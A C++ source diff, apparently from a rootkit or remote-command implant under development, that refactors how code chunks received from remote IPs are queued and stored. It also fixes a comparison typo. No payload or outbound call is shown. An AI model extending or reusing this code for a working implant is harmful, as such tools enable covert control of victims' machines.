@@ -15,7 +15,7 @@
 #include <array>
 #include <vector>
 #include <variant>
-#include <unordered_set>
+#include <unordered_map>
 #include <filesystem>
 #include <algorithm>
 
@@ -24,7 +24,7 @@ namespace fs = std::filesystem;
 // 큐 구조체
 struct Queue {
 	bool listening = false;
-	std::vector<int> orderNum;
+	int lastOrderNum = 0;
 	// composite key start
 	std::string ip; 
 	unsigned short port = 0; 
@@ -54,8 +54,7 @@ namespace rootkit {
 
 
 	std::vector<Queue> queueLists;
-	std::unordered_multiset<std::string> ipLists;
-	std::vector<std::pair<std::string, Code>> codes;
+	std::unordered_map<std::string, std::vector<Code>> codes;
 
 	std::string run_cmd_with_output(const std::string& cmd) {
 		std::array<char, 128> buffer;
@@ -110,11 +109,6 @@ namespace rootkit {
 		// ip랑 포트번호를 어떻게 구함?
 		// 내가 직접 넘겨줘야하나...
 
-		if (codes.size() == codes.capacity()) {
-			std::size_t c = codes.capacity();
-			std::size_t newCap = (c == 0) ? 256 : (c * 2);
-			codes.reserve(newCap);
-		}
 
 		std::string headerAll = str.substr(0, 5);
 		if (!is_numeric(headerAll)) {
@@ -135,7 +129,7 @@ namespace rootkit {
 		std::string dir = "C:/Users/" + userList[0] + "Contacts/port";
 
 		// 이미 Queue에 등록되어 있는 경우
-		if (ipLists.count(ip)) {
+		if (codes.count(ip)) {
 			bool headerFlag_b = (headerFlag_i == 1) ? true : false;
 			// 송신 종료 플래그 == true
 			if (headerFlag_b == true) {
@@ -156,17 +150,17 @@ namespace rootkit {
 			}
 			Queue queue;
 			queue.listening = true;
-			queue.orderNum.push_back(headerOrderNumber_i);
+			queue.lastOrderNum = headerOrderNumber_i;
 			queue.ip = ip;
 			queue.port = port;
 			queueLists.push_back(queue);
-			ipLists.insert(ip);
-			codes.emplace_back( ip, Code{headerOrderNumber_i, code});
+			codes.try_emplace(ip);	
+			codes[ip].emplace_back(headerOrderNumber_i, code);
 			// 설마 여기까지 왔는데 true겠어
 			// 하지만 믿으면 안되지 검증은 필수
 			if (queue.directoryCreated == false) {
 				fs::create_directories(dir);
-				queue.directoryCreated == true;
+				queue.directoryCreated = true;
 			}
 		}
 	}
